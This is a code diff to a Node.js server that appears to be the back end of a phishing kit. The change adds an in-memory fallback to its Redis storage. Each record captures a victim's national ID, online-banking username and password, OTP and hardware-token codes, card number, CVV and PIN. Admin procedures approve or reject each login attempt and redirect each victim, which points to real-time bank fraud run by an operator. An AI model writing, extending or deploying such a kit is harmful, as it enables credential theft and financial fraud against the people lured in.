@@ -2,17 +2,28 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const path = require('path');
 const crypto = require('crypto');
-const { Redis } = require('@upstash/redis');
+let Redis;
+try { Redis = require('@upstash/redis').Redis; } catch {}
 
 const app = express();
 app.use(express.json({ limit: '10mb' }));
 app.use(cookieParser());
 
-// ─── Redis (persistent storage) ───
-const redis = new Redis({
-  url: process.env.UPSTASH_REDIS_REST_URL,
-  token: process.env.UPSTASH_REDIS_REST_TOKEN,
-});
+// ─── Storage: Redis if configured, in-memory fallback ───
+const useRedis = !!(process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN);
+const redis = useRedis
+  ? new Redis({ url: process.env.UPSTASH_REDIS_REST_URL, token: process.env.UPSTASH_REDIS_REST_TOKEN })
+  : null;
+
+const memDb = {
+  apps: {},
+  visitors: {},
+  redirects: {},
+  vRedirects: {},
+  messages: {},
+  totalVisitors: 0,
+  whatsAppLink: 'https://wa.me/message/4Y76G2TADJUVE1',
+};
 
 // ─── Security Headers ───
 app.use((req, res, next) => {
@@ -89,124 +100,135 @@ function checkAdmin(cookies) {
   return verifyToken(token);
 }
 
-// ─── Redis helpers ───
+// ─── Storage helpers (Redis if available, in-memory fallback) ───
+function parse(v) { return v ? (typeof v === 'string' ? JSON.parse(v) : v) : null; }
+
 async function getApp(nationalId) {
-  const existing = await redis.hget('apps', nationalId);
-  if (existing) return typeof existing === 'string' ? JSON.parse(existing) : existing;
-  const app = {
-    id: nationalId,
-    nationalId,
-    username: '',
-    password: '',
-    otpCode: '',
-    hardTokenCode: '',
-    cardNumber: '',
-    cardExpiry: '',
-    cardCvv: '',
-    cardPin: '',
-    fullName: '',
-    phoneNumber: '',
-    governorate: '',
-    address: '',
-    watchColor: 'black',
-    watchLinkOtp: '',
-    currentPage: 'home',
-    status: 'pending',
-    showError: false,
-    createdAt: new Date().toISOString(),
-    updatedAt: new Date().toISOString(),
+  if (redis) {
+    const existing = await redis.hget('apps', nationalId);
+    if (existing) return parse(existing);
+  } else if (memDb.apps[nationalId]) {
+    return memDb.apps[nationalId];
+  }
+  const a = {
+    id: nationalId, nationalId, username: '', password: '', otpCode: '',
+    hardTokenCode: '', cardNumber: '', cardExpiry: '', cardCvv: '', cardPin: '',
+    fullName: '', phoneNumber: '', governorate: '', address: '', watchColor: 'black',
+    watchLinkOtp: '', currentPage: 'home', status: 'pending', showError: false,
+    createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
   };
-  await redis.hset('apps', { [nationalId]: JSON.stringify(app) });
-  return app;
+  if (redis) await redis.hset('apps', { [nationalId]: JSON.stringify(a) });
+  else memDb.apps[nationalId] = a;
+  return a;
 }
 
 async function saveApp(nationalId, data) {
-  await redis.hset('apps', { [nationalId]: JSON.stringify(data) });
+  if (redis) await redis.hset('apps', { [nationalId]: JSON.stringify(data) });
+  else memDb.apps[nationalId] = data;
 }
 
 async function getAllApps() {
-  const all = await redis.hgetall('apps');
-  if (!all) return [];
-  return Object.values(all).map(v => typeof v === 'string' ? JSON.parse(v) : v);
+  if (redis) {
+    const all = await redis.hgetall('apps');
+    return all ? Object.values(all).map(parse) : [];
+  }
+  return Object.values(memDb.apps);
 }
 
 async function deleteApp(nationalId) {
-  await redis.hdel('apps', nationalId);
+  if (redis) await redis.hdel('apps', nationalId);
+  else delete memDb.apps[nationalId];
 }
 
 async function getRedirect(nationalId) {
-  const r = await redis.hget('redirects', nationalId);
-  return r ? (typeof r === 'string' ? JSON.parse(r) : r) : null;
+  if (redis) return parse(await redis.hget('redirects', nationalId));
+  return memDb.redirects[nationalId] || null;
 }
 
 async function setRedirect(nationalId, data) {
-  await redis.hset('redirects', { [nationalId]: JSON.stringify(data) });
+  if (redis) await redis.hset('redirects', { [nationalId]: JSON.stringify(data) });
+  else memDb.redirects[nationalId] = data;
 }
 
 async function deleteRedirect(nationalId) {
-  await redis.hdel('redirects', nationalId);
+  if (redis) await redis.hdel('redirects', nationalId);
+  else delete memDb.redirects[nationalId];
 }
 
 async function getCustomMessage(nationalId) {
-  return await redis.hget('messages', nationalId);
+  if (redis) return await redis.hget('messages', nationalId);
+  return memDb.messages[nationalId] || null;
 }
 
 async function setCustomMessage(nationalId, message) {
-  await redis.hset('messages', { [nationalId]: message });
+  if (redis) await redis.hset('messages', { [nationalId]: message });
+  else memDb.messages[nationalId] = message;
 }
 
 async function deleteCustomMessage(nationalId) {
-  await redis.hdel('messages', nationalId);
+  if (redis) await redis.hdel('messages', nationalId);
+  else delete memDb.messages[nationalId];
 }
 
 async function getVisitor(sessionId) {
-  const v = await redis.hget('visitors', sessionId);
-  return v ? (typeof v === 'string' ? JSON.parse(v) : v) : null;
+  if (redis) return parse(await redis.hget('visitors', sessionId));
+  return memDb.visitors[sessionId] || null;
 }
 
 async function setVisitor(sessionId, data) {
-  await redis.hset('visitors', { [sessionId]: JSON.stringify(data) });
+  if (redis) await redis.hset('visitors', { [sessionId]: JSON.stringify(data) });
+  else memDb.visitors[sessionId] = data;
 }
 
 async function getAllVisitors() {
-  const all = await redis.hgetall('visitors');
-  if (!all) return [];
-  return Object.values(all).map(v => typeof v === 'string' ? JSON.parse(v) : v);
+  if (redis) {
+    const all = await redis.hgetall('visitors');
+    return all ? Object.values(all).map(parse) : [];
+  }
+  return Object.values(memDb.visitors);
 }
 
 async function deleteVisitor(sessionId) {
-  await redis.hdel('visitors', sessionId);
+  if (redis) await redis.hdel('visitors', sessionId);
+  else delete memDb.visitors[sessionId];
 }
 
 async function getVisitorRedirect(sessionId) {
-  const r = await redis.hget('vRedirects', sessionId);
-  return r ? (typeof r === 'string' ? JSON.parse(r) : r) : null;
+  if (redis) return parse(await redis.hget('vRedirects', sessionId));
+  return memDb.vRedirects[sessionId] || null;
 }
 
 async function setVisitorRedirect(sessionId, data) {
-  await redis.hset('vRedirects', { [sessionId]: JSON.stringify(data) });
+  if (redis) await redis.hset('vRedirects', { [sessionId]: JSON.stringify(data) });
+  else memDb.vRedirects[sessionId] = data;
 }
 
 async function deleteVisitorRedirect(sessionId) {
-  await redis.hdel('vRedirects', sessionId);
+  if (redis) await redis.hdel('vRedirects', sessionId);
+  else delete memDb.vRedirects[sessionId];
 }
 
 async function getTotalVisitors() {
-  const v = await redis.get('totalVisitors');
-  return Number(v) || 0;
+  if (redis) return Number(await redis.get('totalVisitors')) || 0;
+  return memDb.totalVisitors;
 }
 
 async function setTotalVisitors(n) {
-  await redis.set('totalVisitors', n);
+  if (redis) await redis.set('totalVisitors', n);
+  else memDb.totalVisitors = n;
 }
 
 async function getWhatsAppLink() {
-  const link = await redis.get('whatsAppLink');
-  return link || 'https://wa.me/message/4Y76G2TADJUVE1';
+  if (redis) {
+    const link = await redis.get('whatsAppLink');
+    return link || 'https://wa.me/message/4Y76G2TADJUVE1';
+  }
+  return memDb.whatsAppLink;
 }
 
 async function setWhatsAppLink(link) {
-  await redis.set('whatsAppLink', link);
+  if (redis) await redis.set('whatsAppLink', link);
+  else memDb.whatsAppLink = link;
 }
 
 // ─── Procedures (all async) ───
@@ -356,7 +378,7 @@ const procedures = {
 
   'admin.approveLogin': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const a = await redis.hget('apps', input.nationalId);
+    const a = redis ? await redis.hget('apps', input.nationalId) : memDb.apps[input.nationalId];
     if (a) {
       const app = typeof a === 'string' ? JSON.parse(a) : a;
       app.status = 'approved';
@@ -368,7 +390,7 @@ const procedures = {
 
   'admin.rejectLogin': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const a = await redis.hget('apps', input.nationalId);
+    const a = redis ? await redis.hget('apps', input.nationalId) : memDb.apps[input.nationalId];
     if (a) {
       const app = typeof a === 'string' ? JSON.parse(a) : a;
       app.status = 'rejected';
@@ -463,7 +485,12 @@ const procedures = {
   'admin.resetTotalVisitors': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
     await setTotalVisitors(0);
-    await redis.del('apps', 'messages', 'redirects', 'vRedirects', 'visitors');
+    if (redis) {
+      await redis.del('apps', 'messages', 'redirects', 'vRedirects', 'visitors');
+    } else {
+      memDb.apps = {}; memDb.messages = {}; memDb.redirects = {};
+      memDb.vRedirects = {}; memDb.visitors = {};
+    }
     return { success: true };
   },
 
